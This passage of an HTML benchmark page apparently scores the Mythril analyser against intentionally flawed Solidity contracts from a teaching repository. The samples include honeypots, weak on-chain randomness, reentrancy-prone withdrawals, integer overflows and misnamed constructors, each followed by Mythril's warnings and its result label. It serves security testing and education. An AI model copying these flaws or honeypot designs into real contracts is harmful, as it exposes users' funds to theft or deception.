        <span class="k">if</span><span class="p">(</span><span class="n">luckyNumberOfAddress</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">)</span> <span class="o">==</span> <span class="n">LuckyNumber</span><span class="p">){</span> <span class="c1">//check if it equals 7</span>
            <span class="n">winner</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// every address can only win once</span>
            
            <span class="kt">uint</span> <span class="n">win</span><span class="o">=</span><span class="nb">msg.value</span><span class="o">*</span><span class="mi">7</span><span class="p">;</span> <span class="c1">//win = 7 times the ticket price</span>
            
            <span class="k">if</span><span class="p">(</span><span class="n">win</span><span class="o">&gt;</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">)</span> <span class="c1">//if the balance isnt sufficient...</span>
                <span class="n">win</span><span class="o">=</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">;</span> <span class="c1">//...send everything we&#39;ve got</span>
            <span class="nb">msg.sender</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="n">win</span><span class="p">);</span>
        <span class="p">}</span>
        
        <span class="k">if</span><span class="p">(</span><span class="nb">block.number</span><span class="o">-</span><span class="n">lastReseed</span><span class="o">&gt;</span><span class="mi">1000</span><span class="p">)</span> <span class="c1">//reseed if needed</span>
            <span class="n">reseed</span><span class="p">(</span><span class="n">SeedComponents</span><span class="p">((</span><span class="kt">uint</span><span class="p">)(</span><span class="nb">block.coinbase</span><span class="p">),</span> <span class="nb">block.difficulty</span><span class="p">,</span> <span class="nb">block.gaslimit</span><span class="p">,</span> <span class="nb">block.timestamp</span><span class="p">));</span> <span class="c1">//generate a quality random seed</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">luckyNumberOfAddress</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">n</span><span class="p">){</span>
        <span class="c1">// calculate the number of current address - 1 in 8 chance</span>
        <span class="n">n</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="kt">uint</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span> <span class="n">secretSeed</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="o">%</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">reseed</span><span class="p">(</span><span class="n">SeedComponents</span> <span class="n">components</span><span class="p">)</span> <span class="kr">internal</span> <span class="p">{</span>
        <span class="n">secretSeed</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span>
            <span class="n">components</span><span class="p">.</span><span class="n">component1</span><span class="p">,</span>
            <span class="n">components</span><span class="p">.</span><span class="n">component2</span><span class="p">,</span>
            <span class="n">components</span><span class="p">.</span><span class="n">component3</span><span class="p">,</span>
            <span class="n">components</span><span class="p">.</span><span class="n">component4</span>
        <span class="p">));</span> <span class="c1">//hash the incoming parameters and use the hash to (re)initialize the seed</span>
        <span class="n">lastReseed</span> <span class="o">=</span> <span class="nb">block.number</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">kill</span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nb">msg.sender</span><span class="o">==</span><span class="n">owner</span><span class="p">);</span>
        
        <span class="nb">selfdestruct</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">forceReseed</span><span class="p">()</span> <span class="p">{</span> <span class="c1">//reseed initiated by the owner - for testing purposes</span>
        <span class="nf">require</span><span class="p">(</span><span class="nb">msg.sender</span><span class="o">==</span><span class="n">owner</span><span class="p">);</span>
        
        <span class="n">SeedComponents</span> <span class="n">s</span><span class="p">;</span>
        <span class="n">s</span><span class="p">.</span><span class="n">component1</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">);</span>
        <span class="n">s</span><span class="p">.</span><span class="n">component2</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">block.blockhash</span><span class="p">(</span><span class="nb">block.number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
        <span class="n">s</span><span class="p">.</span><span class="n">component3</span> <span class="o">=</span> <span class="nb">block.difficulty</span><span class="o">*</span><span class="p">(</span><span class="kt">uint</span><span class="p">)(</span><span class="nb">block.coinbase</span><span class="p">);</span>
        <span class="n">s</span><span class="p">.</span><span class="n">component4</span> <span class="o">=</span> <span class="nb">tx.gasprice</span> <span class="o">*</span> <span class="mi">7</span><span class="p">;</span>
        
        <span class="n">reseed</span><span class="p">(</span><span class="n">s</span><span class="p">);</span> <span class="c1">//reseed</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="p">()</span> <span class="kr">payable</span> <span class="p">{</span> <span class="c1">//if someone sends money without any function call, just assume he wanted to participate</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">msg.value</span><span class="o">&gt;=</span><span class="mf">0.1</span> <span class="kc">ether</span> <span class="o">&amp;&amp;</span> <span class="nb">msg.sender</span><span class="o">!=</span><span class="n">owner</span><span class="p">)</span> <span class="c1">//owner can&#39;t participate, he can only fund the jackpot</span>
            <span class="n">participate</span><span class="p">();</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 85: block.number - 1</pre>
                  <h5>Issue Integer Underflow (Warning)</h5>
         A possible integer underflow exists in the function `forceReseed()`.
The subtraction may result in a value &lt; 0.
                          <h5>Location</h5>
           <pre>Line 86: block.difficulty*(uint)(block.coinbase)</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `forceReseed()`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                          <h5>Location</h5>
           <pre>Line 87: tx.gasprice * 7</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `forceReseed()`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                <hr>
    <h3 id=honeypots/Multiplicator/Multiplicator>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//honeypots/Multiplicator/Multiplicator.sol">honeypots/Multiplicator/Multiplicator</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>honeypots</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Multiplicator</span>
<span class="p">{</span>
    <span class="kt">address</span> <span class="kr">public</span> <span class="n">Owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
   
    <span class="kd">function</span><span class="p">()</span><span class="kr">payable</span><span class="p">{}</span>
   
    <span class="kd">function</span> <span class="n">withdraw</span><span class="p">()</span>
    <span class="kr">payable</span>
    <span class="kr">public</span>
    <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nb">msg.sender</span> <span class="o">==</span> <span class="n">Owner</span><span class="p">);</span>
        <span class="n">Owner</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">multiplicate</span><span class="p">(</span><span class="kt">address</span> <span class="n">adr</span><span class="p">)</span>
    <span class="kr">payable</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">msg.value</span><span class="o">&gt;=</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">)</span>
        <span class="p">{</span>        
            <span class="n">adr</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="o">+</span><span class="nb">msg.value</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=honeypots/PrivateBank/PrivateBank>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//honeypots/PrivateBank/PrivateBank.sol">honeypots/PrivateBank/PrivateBank</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>honeypots</td>
	        <td style="background-color:
		   rgba(253, 195, 83, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Timed-Out">Timed Out</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">19</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Private_Bank</span>
<span class="p">{</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="n">balances</span><span class="p">;</span>
    
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">MinDeposit</span> <span class="o">=</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">;</span>
    
    <span class="n">Log</span> <span class="n">TransferLog</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="n">Private_Bank</span><span class="p">(</span><span class="kt">address</span> <span class="n">_log</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">TransferLog</span> <span class="o">=</span> <span class="n">Log</span><span class="p">(</span><span class="n">_log</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">Deposit</span><span class="p">()</span>
    <span class="kr">public</span>
    <span class="kr">payable</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">msg.value</span> <span class="o">&gt;=</span> <span class="n">MinDeposit</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span><span class="o">+=</span><span class="nb">msg.value</span><span class="p">;</span>
            <span class="n">TransferLog</span><span class="p">.</span><span class="n">AddMessage</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span><span class="nb">msg.value</span><span class="p">,</span><span class="s">&quot;Deposit&quot;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">CashOut</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_am</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">_am</span><span class="o">&lt;=</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">])</span>
        <span class="p">{</span>
            
            <span class="k">if</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">_am</span><span class="p">)())</span>
            <span class="p">{</span>
                <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span><span class="o">-=</span><span class="n">_am</span><span class="p">;</span>
                <span class="n">TransferLog</span><span class="p">.</span><span class="n">AddMessage</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span><span class="n">_am</span><span class="p">,</span><span class="s">&quot;CashOut&quot;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="kd">function</span><span class="p">()</span> <span class="kr">public</span> <span class="kr">payable</span><span class="p">{}</span>    
    
<span class="p">}</span>

<span class="kd">contract</span> <span class="n">Log</span> 
<span class="p">{</span>
   
    <span class="kd">struct</span> <span class="n">Message</span>
    <span class="p">{</span>
        <span class="kt">address</span> <span class="n">Sender</span><span class="p">;</span>
        <span class="kt">string</span>  <span class="n">Data</span><span class="p">;</span>
        <span class="kt">uint</span> <span class="n">Val</span><span class="p">;</span>
        <span class="kt">uint</span>  <span class="n">Time</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="n">Message</span><span class="p">[]</span> <span class="kr">public</span> <span class="n">History</span><span class="p">;</span>
    
    <span class="n">Message</span> <span class="n">LastMsg</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="n">AddMessage</span><span class="p">(</span><span class="kt">address</span> <span class="n">_adr</span><span class="p">,</span><span class="kt">uint</span> <span class="n">_val</span><span class="p">,</span><span class="kt">string</span> <span class="n">_data</span><span class="p">)</span>
    <span class="kr">public</span>
    <span class="p">{</span>
        <span class="n">LastMsg</span><span class="p">.</span><span class="n">Sender</span> <span class="o">=</span> <span class="n">_adr</span><span class="p">;</span>
        <span class="n">LastMsg</span><span class="p">.</span><span class="n">Time</span> <span class="o">=</span> <span class="nb">now</span><span class="p">;</span>
        <span class="n">LastMsg</span><span class="p">.</span><span class="n">Val</span> <span class="o">=</span> <span class="n">_val</span><span class="p">;</span>
        <span class="n">LastMsg</span><span class="p">.</span><span class="n">Data</span> <span class="o">=</span> <span class="n">_data</span><span class="p">;</span>
        <span class="n">History</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="n">LastMsg</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=honeypots/VarLoop/VarLoop>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//honeypots/VarLoop/VarLoop.sol">honeypots/VarLoop/VarLoop</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>honeypots</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Test1</span>
<span class="p">{</span>
    <span class="kt">address</span> <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="n">withdraw</span><span class="p">()</span>
    <span class="kr">payable</span>
    <span class="kr">public</span>
    <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nb">msg.sender</span><span class="o">==</span><span class="n">owner</span><span class="p">);</span>
        <span class="n">owner</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span><span class="p">()</span> <span class="kr">payable</span> <span class="p">{}</span>
    
    <span class="kd">function</span> <span class="n">Test</span><span class="p">()</span>
    <span class="kr">payable</span>
    <span class="kr">public</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">msg.value</span><span class="o">&gt;=</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">)</span>
        <span class="p">{</span>
            
            <span class="kd">var</span> <span class="n">i1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="kd">var</span> <span class="n">i2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="kd">var</span> <span class="n">amX2</span> <span class="o">=</span> <span class="nb">msg.value</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span>
            
            <span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="n">i1</span><span class="o">&lt;</span><span class="n">i2</span><span class="p">)</span><span class="k">break</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="n">i1</span><span class="o">&gt;</span><span class="n">amX2</span><span class="p">)</span><span class="k">break</span><span class="p">;</span>
                
                <span class="n">i2</span><span class="o">=</span><span class="n">i1</span><span class="p">;</span>
                <span class="n">i1</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nb">msg.sender</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="n">i2</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 26: msg.value*2</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `Test()`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                          <h5>Location</h5>
           <pre>Line 36: msg.sender.transfer(i2)</pre>
                  <h5>Issue Ether send (Warning)</h5>
         In the function `Test()` a non-zero amount of Ether is sent to msg.sender.
It seems that this function can be called without restrictions.
                <hr>
    <h3 id=incorrect_interface/Alice>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//incorrect_interface/Alice.sol">incorrect_interface/Alice</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Incorrect Interface</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">15</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Alice</span> <span class="p">{</span> 
    <span class="kt">int</span> <span class="kr">public</span> <span class="n">val</span><span class="p">;</span>

    <span class="kd">function</span> <span class="n">set</span><span class="p">(</span><span class="kt">int</span> <span class="n">new_val</span><span class="p">){</span>
        <span class="n">val</span> <span class="o">=</span> <span class="n">new_val</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">set_fixed</span><span class="p">(</span><span class="kt">int</span> <span class="n">new_val</span><span class="p">){</span>
        <span class="n">val</span> <span class="o">=</span> <span class="n">new_val</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span><span class="p">(){</span>
        <span class="n">val</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=incorrect_interface/Bob>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//incorrect_interface/Bob.sol">incorrect_interface/Bob</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Incorrect Interface</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">15</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Alice</span> <span class="p">{</span> 
    <span class="kd">function</span> <span class="n">set</span><span class="p">(</span><span class="kt">uint</span><span class="p">);</span> 
    <span class="kd">function</span> <span class="n">set_fixed</span><span class="p">(</span><span class="kt">int</span><span class="p">);</span> 
<span class="p">}</span>

<span class="kd">contract</span> <span class="n">Bob</span> <span class="p">{</span> 
    <span class="kd">function</span> <span class="n">set</span><span class="p">(</span><span class="n">Alice</span> <span class="n">c</span><span class="p">){</span> 
        <span class="n">c</span><span class="p">.</span><span class="n">set</span><span class="p">(</span><span class="mi">42</span><span class="p">);</span> 
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">set_fixed</span><span class="p">(</span><span class="n">Alice</span> <span class="n">c</span><span class="p">){</span> 
        <span class="n">c</span><span class="p">.</span><span class="n">set_fixed</span><span class="p">(</span><span class="mi">42</span><span class="p">);</span> 
    <span class="p">}</span> 
<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 11: c.set(42)</pre>
                  <h5>Issue Message call to external contract (Warning)</h5>
         This contract executes a message call to an address provided as a function argument. Generally, it is not recommended to call user-supplied addresses using Solidity&#39;s call() construct. Note that attackers might leverage reentrancy attacks to exploit race conditions or manipulate this contract&#39;s state.
                          <h5>Location</h5>
           <pre>Line 15: c.set_fixed(42)</pre>
                  <h5>Issue Message call to external contract (Warning)</h5>
         This contract executes a message call to an address provided as a function argument. Generally, it is not recommended to call user-supplied addresses using Solidity&#39;s call() construct. Note that attackers might leverage reentrancy attacks to exploit race conditions or manipulate this contract&#39;s state.
                <hr>
    <h3 id=integer_overflow/interger_overflow_1>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//integer_overflow/interger_overflow_1.sol">integer_overflow/interger_overflow_1</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Integer Overflow</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">15</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Overflow</span> <span class="p">{</span>
    <span class="kt">uint</span> <span class="kr">private</span> <span class="n">sellerBalance</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="n">add</span><span class="p">(</span><span class="kt">uint</span> <span class="n">value</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
        <span class="n">sellerBalance</span> <span class="o">+=</span> <span class="n">value</span><span class="p">;</span> <span class="c1">// possible overflow</span>

        <span class="c1">// possible auditor assert</span>
        <span class="c1">// assert(sellerBalance &gt;= value); </span>
    <span class="p">}</span> 

    <span class="kd">function</span> <span class="n">safe_add</span><span class="p">(</span><span class="kt">uint</span> <span class="n">value</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
        <span class="nf">require</span><span class="p">(</span><span class="n">value</span> <span class="o">+</span> <span class="n">sellerBalance</span> <span class="o">&gt;=</span> <span class="n">sellerBalance</span><span class="p">);</span>
        <span class="n">sellerBalance</span> <span class="o">+=</span> <span class="n">value</span><span class="p">;</span> 
    <span class="p">}</span> 
<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 7: sellerBalance += value</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `add(uint256)`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                <hr>
    <h3 id=missing_constructor/Missing>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//missing_constructor/Missing.sol">missing_constructor/Missing</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Missing Constructor</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">15</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Missing</span><span class="p">{</span>
    <span class="kt">address</span> <span class="kr">private</span> <span class="n">owner</span><span class="p">;</span>

    <span class="kd">modifier</span> <span class="n">onlyowner</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nb">msg.sender</span><span class="o">==</span><span class="n">owner</span><span class="p">);</span>
        <span class="kr">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// The name of the constructor should be Missing</span>
    <span class="c1">// Anyone can call the IamMissing once the contract is deployed</span>
    <span class="kd">function</span> <span class="n">IamMissing</span><span class="p">()</span>
        <span class="kr">public</span> 
    <span class="p">{</span>
        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">withdraw</span><span class="p">()</span> 
        <span class="kr">public</span> 
        <span class="n">onlyowner</span>
    <span class="p">{</span>
       <span class="n">owner</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 23: owner.transfer(this.balance)</pre>
                  <h5>Issue Ether send (Warning)</h5>
         In the function `withdraw()` a non-zero amount of Ether is sent to an address taken from storage slot 0.
There is a check on storage index 0. This storage slot can be written to by calling the function `IamMissing()`.

There is a check on storage index 0. This storage slot can be written to by calling the function `IamMissing()`.
                          <h5>Location</h5>
           <pre>Line 23: owner.transfer(this.balance)</pre>
                  <h5>Issue Transaction order dependence (Warning)</h5>
         A possible transaction order independence vulnerability exists in function withdraw(). The value or direction of the call statement is determined from a tainted storage location
                <hr>
    <h3 id=missing_constructor/Rubixi_source_code/Rubixi>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//missing_constructor/Rubixi_source_code/Rubixi.sol">missing_constructor/Rubixi_source_code/Rubixi</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Missing Constructor</td>
	        <td style="background-color:
		   rgba(128, 128, 128, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Unconfigured">Unconfigured</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="c1">// 0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code</span>

<span class="kd">contract</span> <span class="n">Rubixi</span> <span class="p">{</span>

        <span class="c1">//Declare variables for storage critical to contract</span>
        <span class="kt">uint</span> <span class="kr">private</span> <span class="nb">balance</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">uint</span> <span class="kr">private</span> <span class="n">collectedFees</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">uint</span> <span class="kr">private</span> <span class="n">feePercent</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
        <span class="kt">uint</span> <span class="kr">private</span> <span class="n">pyramidMultiplier</span> <span class="o">=</span> <span class="mi">300</span><span class="p">;</span>
        <span class="kt">uint</span> <span class="kr">private</span> <span class="n">payoutOrder</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="kt">address</span> <span class="kr">private</span> <span class="n">creator</span><span class="p">;</span>

        <span class="c1">//Sets creator</span>
        <span class="kd">function</span> <span class="n">DynamicPyramid</span><span class="p">()</span> <span class="p">{</span>
                <span class="n">creator</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">modifier</span> <span class="n">onlyowner</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">msg.sender</span> <span class="o">==</span> <span class="n">creator</span><span class="p">)</span> <span class="kr">_</span>
        <span class="p">}</span>

        <span class="kd">struct</span> <span class="n">Participant</span> <span class="p">{</span>
                <span class="kt">address</span> <span class="n">etherAddress</span><span class="p">;</span>
                <span class="kt">uint</span> <span class="n">payout</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">Participant</span><span class="p">[]</span> <span class="kr">private</span> <span class="n">participants</span><span class="p">;</span>

        <span class="c1">//Fallback function</span>
        <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                <span class="n">init</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="c1">//init function run on fallback</span>
        <span class="kd">function</span> <span class="n">init</span><span class="p">()</span> <span class="kr">private</span> <span class="p">{</span>
                <span class="c1">//Ensures only tx with value of 1 ether or greater are processed and added to pyramid</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">collectedFees</span> <span class="o">+=</span> <span class="nb">msg.value</span><span class="p">;</span>
                        <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="kt">uint</span> <span class="n">_fee</span> <span class="o">=</span> <span class="n">feePercent</span><span class="p">;</span>
                <span class="c1">//50% fee rebate on any ether value of 50 or greater</span>
